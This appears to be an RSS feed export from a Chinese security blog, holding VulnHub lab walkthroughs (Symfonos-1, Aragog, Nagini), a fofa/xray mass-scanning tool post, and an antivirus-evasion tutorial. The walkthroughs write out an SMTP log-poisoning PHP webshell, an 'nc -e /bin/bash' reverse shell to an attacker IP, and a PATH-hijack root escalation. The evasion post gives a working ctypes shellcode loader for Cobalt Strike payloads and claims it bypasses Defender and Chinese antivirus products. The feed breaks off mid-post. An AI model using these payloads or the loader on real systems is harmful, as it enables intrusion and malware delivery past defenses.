    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机地址 <a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>探测存活ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051434477.png"></p><p>对靶机进行详细扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051435562.png"></p><p>开放了smb服务,跑一下smb服务探测工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.31.217</span><br></pre></td></tr></table></figure><p>扫出一个anonymous可访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051439999.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.217/anonymous -U % N</span><br><span class="line">这里 -U 表示用户名，% 表示用户名。</span><br><span class="line">参数 -N 用于空密码</span><br></pre></td></tr></table></figure><p>发现一个txt文件,下载下来看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051441152.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051441146.png"></p><p>提示密码是这三个,结合上面smb信息收集的时候存在一个要密码的目录,爆破试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.217/helios -U helios</span><br><span class="line">密码为 qwerty</span><br></pre></td></tr></table></figure><p>存在两个txt文件,下载下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051447053.png"></p><p>提示里似乎是一个目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051448292.png"></p><p>访问网站首页看看这个路径,成功跳转,但是有的css文件没加载出来,看到请求网址,修改host解析</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051450223.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;192.168.31.217 symfonos.local&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>WordPress,直接掏出wpscan,wpscan扫描漏洞需要token</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://symfonos.local/h3l105/ -e p --api-token xxxxxxx你的apitokenxxxx</span><br></pre></td></tr></table></figure><p>扫出漏洞大多是xss,没什么用,但是存在一个文件包含</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051509667.png"></p><p>可以读文件,那么可以尝试密码找回,再去重置密码,账号为admin</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520097.png"></p><p>读取邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520350.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520093.png"></p><p>但是进入后台拿shell无果,尝试使用SMTP日志投毒配合LFI来进行RCE</p><h2 id="SMTP日志投毒RCE"><a href="#SMTP日志投毒RCE" class="headerlink" title="SMTP日志投毒RCE"></a>SMTP日志投毒RCE</h2><p>写入webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.31.217 25</span><br><span class="line">MAIL FROM: &lt;<span class="built_in">test</span>&gt;</span><br><span class="line">RCPT TO: Helios</span><br><span class="line">data</span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051526411.png"></p><p>配合文件包含来rce,访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;a=ip a </span><br></pre></td></tr></table></figure><p>成功执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051528782.png"></p><p>kali监听,访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;a=nc -nv 192.168.31.118 4444 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051530816.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>python返回一个半交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>linux提权,suid sudo 内核</p><p>存在不常见suid文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051533457.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051534603.png"></p><p>用file命令查看文件类型</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051537986.png"></p><p>用strings打印一下他干了什么</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051540193.png"></p><p>似乎是一个发包器,用curl -I <a href="http://localhost/">http://localhost</a> 访问本地</p><p>这样的话,我们可以自定义一个curl文件,顶替掉原来的curl命令,用来反弹一个root权限的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> $<span class="string">&#x27;#!/bin/sh\n/bin/sh&#x27;</span> &gt; curl <span class="comment">#写入反弹一个shell</span></span><br><span class="line"><span class="built_in">chmod</span> +x curl</span><br><span class="line"><span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>):<span class="variable">$PATH</span> <span class="comment">#构造临时环境变量,让statuscheck文件去执行我们创建的curl</span></span><br><span class="line">/opt/statuscheck</span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051554243.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051556179.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机地址 &lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-1,322/&quot;&gt;https://w</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="smb信息收集" scheme="https://syst1m.top/tags/smb%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="wordpress" scheme="https://syst1m.top/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>python免杀bypass x绒 x60 defender</title>
    <link href="https://syst1m.top/2022/12/04/python%E5%85%8D%E6%9D%80bypass-x%E7%BB%92-x60-defender/"/>
    <id>https://syst1m.top/2022/12/04/python%E5%85%8D%E6%9D%80bypass-x%E7%BB%92-x60-defender/</id>
    <published>2022-12-04T09:29:37.000Z</published>
    <updated>2022-12-04T10:30:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习免杀技术,偶然尝试居然bypass 国内常用杀软,很简单,但却非常使用,效果好到惊呆</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p>cs生成一个python的pyload</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041732758.png"></p><h2 id="构造加载器"><a href="#构造加载器" class="headerlink" title="构造加载器"></a>构造加载器</h2><p>加载器都一样,大同小异,网上很多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode loader</span></span><br><span class="line"><span class="comment"># 返回新字节数组</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h1 id="免杀开始"><a href="#免杀开始" class="headerlink" title="免杀开始"></a>免杀开始</h1><p>将生成的pyload中的shellcode取出来放进加载器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">shellcode = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0...&quot;</span></span><br><span class="line">    <span class="comment"># shellcode loader代码</span></span><br><span class="line">    <span class="comment"># 返回新字节数组</span></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">    <span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    <span class="comment"># 申请内存</span></span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    <span class="comment"># 放入shellcode</span></span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    <span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">    <span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到并没有对加载器进行任何处理,这样打包出来毫无疑问是会被杀的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041741147.png"></p><h2 id="import混淆加密打包bypass"><a href="#import混淆加密打包bypass" class="headerlink" title="import混淆加密打包bypass"></a>import混淆加密打包bypass</h2><p>现在我们把加载器写成一个函数,再通过一个py文件去调用加载器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> shellcodloader</span><br><span class="line">shellcodloader.main()</span><br></pre></td></tr></table></figure><p>最终目录如下:</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041744127.png"></p><p>然后使用pyinstaller开始打包 –key 对二进制文件进行加密,防止反编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F main.py --key <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h2 id="x绒"><a href="#x绒" class="headerlink" title="x绒"></a>x绒</h2><p>可以看到我们没有对加载器做任何免杀操作,但是依旧免杀,简单实用.测试时间2022.12.4</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041749331.png"></p><h2 id="x60-核晶开启"><a href="#x60-核晶开启" class="headerlink" title="x60 核晶开启"></a>x60 核晶开启</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041750463.png"></p><h2 id="defender"><a href="#defender" class="headerlink" title="defender"></a>defender</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041751616.png"></p><h1 id="cs执行命令"><a href="#cs执行命令" class="headerlink" title="cs执行命令"></a>cs执行命令</h1><p>以上都可以正常上线cs并执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041751869.png"></p><h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/chencicici/python_bypass">https://github.com/chencicici/python_bypass</a></p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>并没有上传微步和vt,因为已经够用了.以上仅仅使用import混淆导包和pyinstaller加密生成exe,还没有对shellcode和加载器进行加密混淆,已经免杀国内常用杀软.后续对shellcode进行加密或者分离加载,效果只会更好</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近学习免杀技术,偶然尝试居然bypass 国内常用杀软,很简单,但却非常使用,效果好到惊呆&lt;/p&gt;
&lt;h1 id=&quot;准备&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
    
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="bypass" scheme="https://syst1m.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Auto_xray批量缝合怪</title>
    <link href="https://syst1m.top/2022/11/22/Auto-xray/"/>
    <id>https://syst1m.top/2022/11/22/Auto-xray/</id>
    <published>2022-11-22T07:49:57.000Z</published>
    <updated>2022-11-22T07:52:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Auto-xray"><a href="#Auto-xray" class="headerlink" title="Auto_xray"></a>Auto_xray</h1><p><strong>工具仅供授权状态下使用,如发生刑事案件,非授权攻击行为于本人无关.望大家熟知《网络安全法》</strong></p><p>因为懒所以写了一个菜鸡缝合怪,缝合fofa xray<br>和fofa2xray差不多,但是我自己在mac端使用fofa2xray体验不是很好,mac端也调用cmd -c,应该是作者调试的时候忘记改了,同时挂服务器上经常跑着跑着就卡住了没反应,不知道是不是我没配置好,索性自己造了个轮子</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>自带mac版的xray1.9.3,其他系统自行替换</p><p>建议部署在linux上,因为windows上的路径文件名和编码可能会导致文件保存出错或者出现乱码</p><p>支持直接使用xray多线程批量扫描指定url列表文件和fofa语法寻找目标扫描需要配置fofa.py中的邮箱 key 搜索语法<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262249314.png"></p><p>扫描完成后邮件提醒.需要配置my_email.py中的邮件地址和key<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262250753.png"></p><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>直接扫描url列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Auto_xray -t 5 指定线程,默认10 -f urls.txt路径 -e True 开启邮件推送</span><br></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>使用fofa批量抓取目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Auto_xray -t 5 指定线程,默认10 -f urls.txt路径 -e True 开启邮件推送 -ff True 开启fofa批量</span><br></pre></td></tr></table></figure><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>部署到后台持久化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> python3 ./Auto_xray.py  -e True  -ff True &amp;  </span><br></pre></td></tr></table></figure><p>更多详细参数 –help<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262248211.png"></p><p>一些默认配置可以修改<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262341074.png"></p><p>项目地址:<a href="https://github.com/chencicici/Auto_xray">https://github.com/chencicici/Auto_xray</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Auto-xray&quot;&gt;&lt;a href=&quot;#Auto-xray&quot; class=&quot;headerlink&quot; title=&quot;Auto_xray&quot;&gt;&lt;/a&gt;Auto_xray&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;工具仅供授权状态下使用,如发生刑事案件,非授权攻击行为于本人无关.望</summary>
      
    
    
    
    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
    
    
    <category term="fofa" scheme="https://syst1m.top/tags/fofa/"/>
    
    <category term="xray" scheme="https://syst1m.top/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-Aragog打靶</title>
    <link href="https://syst1m.top/2022/11/14/vulnhub-Aragog%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/11/14/vulnhub-Aragog%E6%89%93%E9%9D%B6/</id>
    <published>2022-11-14T11:00:32.000Z</published>
    <updated>2022-11-15T07:12:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机 <a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">https://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></p><p>靶机ip:192.168.31.199</p><p>攻击机kali:192.168.31.118</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141905769.png"></p><p>首页没什么东西,先扫一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.199 -x txt,html,php -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141907897.png"></p><p>访问blog目录,发现是wordparess</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141908882.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141923604.png"></p><p>点击notice,发现跳转到一个域名</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141924265.png"></p><p>修改hosts解析,成功跳转,页面正常</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141925408.png"></p><p>用wpscan扫一下,需要token才扫得出漏洞,使用–plugins-detection aggressive 参数,不然那有的漏洞扫不出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordpress.aragog.hogwarts/blog -e p --plugins-detection aggressive --api-token token</span><br></pre></td></tr></table></figure><p>扫出一个插件有rce</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211142320912.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>msf找一下exp</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211142324683.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151401988.png"></p><p>成功反弹会话</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>反弹一个半交互式shell,找到一个base64编码的字符串,没啥用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151408585.png"></p><p>尝试suid 和sudo提权无果,发现进程里有mysql</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151414932.png"></p><p>在&#x2F;etc&#x2F;wordpress下找到root密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151418825.png"></p><p>登录mysql找到一条登录记录 hagrid98 password123</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151434272.png"></p><p>ssh成功登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151438142.png"></p><p>发现一个隐藏文件,应该是用来备份文件的,一般都是定时任务</p><p>写入反弹shell命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151457383.png"></p><p>等待一会,反弹shell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151458157.png"></p><p>发现确实是root的定时任务</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151500562.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机 &lt;a href=&quot;https://www.vulnhub.com/entry/harrypotter-aragog-102,688/&quot;</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="HARRYPOTTER系列" scheme="https://syst1m.top/tags/HARRYPOTTER%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-Nagini打靶</title>
    <link href="https://syst1m.top/2022/11/10/vulnhub-Nagini%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/11/10/vulnhub-Nagini%E6%89%93%E9%9D%B6/</id>
    <published>2022-11-10T10:09:44.000Z</published>
    <updated>2022-11-14T11:02:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub靶场 <a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">https://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p><p>攻击机kali：192,168.1.11</p><p>靶机：192.168.1.12</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101831531.png"></p><p>看看首页只有一张图，扫一下目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101833971.png"></p><p>Joomla cms</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101834687.png"></p><p>进一步扫目录，扫到一个备份文件,去掉后缀.bak直接打开</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101843025.png"></p><p>找到数据库配置，但是没用，数据库不允许外链</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101853030.png"></p><p>线索似乎到这里就断了，没有能利用的地方，msf扫了下cms版本也很高不存在nday，继续信息收集，换个字典用gobuster重新扫目录(换了网络,所以ip变了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.205 -x txt,html,php -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure><p>扫出一个新的txt文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111409457.png"></p><p>翻译为中文,提示我们需要使用http3去访问这个域名</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111415527.png"></p><p>用docker起了一个http3容器,拿到提示,说访问这个目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111506046.png"></p><p>访问发现</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111508939.png"></p><h1 id="ssrf打mysql未授权"><a href="#ssrf打mysql未授权" class="headerlink" title="ssrf打mysql未授权"></a>ssrf打mysql未授权</h1><p>发现存在ssrf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111508436.png"></p><p>结合上面拿到的mysql信息,应该就是通过ssrf打mysql了,需要用到gopher协议</p><p>需要用这个工具去构造gopher payload,工具用python2写的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tarunkant/Gopherus.git</span><br><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111551969.png"></p><p>把链接复制放进去,拿到返回结果(没出结果多刷新几次)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111552593.png"></p><p>继续查询</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111554120.png"></p><p>拿到加密密码,但是解不出,我们可以自己写一个密码进去覆盖掉</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111556736.png"></p><p>构造md5密码(踩坑,看了很多csdn上的wp,都是使用这样的方式去获得md5加密的字符串,这样写进数据库是解析不了的,所以一直登录不进后台,md5sum返回的是文件的hash值用来对比文件是否完整),这样加密的字符串,和在线网站加密的对比不一致,使用md5sum返回的字符串放进数据库里是解析不出来的,无法登录,使用在线网站加密的没问题</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111612007.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111639962.png"></p><p>修改密码(解密为password)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111639586.png"></p><p>根据上面扫出的路径,去后台登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111605165.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>增加一个php</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111701510.png"></p><p>在Extensions -&gt; Templates -&gt; Templates可以编辑模板文件,写反弹马子,或者写一句话都行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111704000.png"></p><p>kali监听,访问 url&#x2F;joomla&#x2F;templates&#x2F;protostar&#x2F;shell.php</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111712630.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在家目录找到一串base64密文,解密为Love@lilly</p><p><img src="https://raw.githubuserontent.com/chencicici/images/main/202211111715095.png"></p><p>在另一个家目录发现一个可执行文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111717900.png"></p><p>没有sudo,看一下suid权限,su_cp,根据文件名猜测就是sudo权限的cp命令</p><p><img 